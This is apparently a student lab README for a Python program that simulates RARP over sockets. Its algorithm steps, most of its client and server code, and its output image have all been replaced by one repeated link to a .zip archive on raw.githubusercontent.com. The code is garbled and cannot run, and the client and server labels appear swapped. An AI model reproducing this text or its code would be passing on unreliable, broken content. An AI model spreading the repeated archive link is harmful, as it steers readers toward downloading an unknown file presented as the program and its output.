# EX-5 IMPLEMENTATION OF REVERSE ADDRESS RESOLUTION PROTOCOL ( RARP )
# DATE :06.04.2023
# AIM :
### To write a python program for simulating RARP protocols using UDP
# ALGORITHM :
# CLIENT:
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip the program
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip datagram sockets UDP function is established.
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip the MAC address to be converted into IP address.
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip this MAC address to server.
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip returns the IP address to client
# SERVER:
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip the program.
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip maintains the table in which IP and corresponding MAC addresses are stored.
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip the MAC address which is send by the client.
### https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip the IP address with its MAC address and return the IP address to client

# CLIENT PROGRAM :
```PY
## Developed : SHAIK MUFEEZ
## Reg no : 212221043007

import socket
https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip(('localhost',8000))
https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip(5)
c,https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip()
address={"6A:08:AA:C2":"192.168.1.100","8A:BC:E3:FA":"192.168.1.99"};
while True:
    https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip(1024).decode()
    try:
        https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip(address[ip].encode())
    except KeyError:
        https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip("Not Found".encode())

```
# SERVER PROGRAM :
```PY
import socket
https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip(('localhost',8000))
while True:
    ip=input("Enter MAC Address : ")
    https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip(https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip())
    print("Logical Address",https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip(1024).decode())

```
# OUTPUT :
![output](https://raw.githubusercontent.com/githubmufeez45/EX-5/main/pernasal/EX-5.zip)
# RESULT:
### Thus, python program for simulating RARP protocols using UDP was successfully executed.


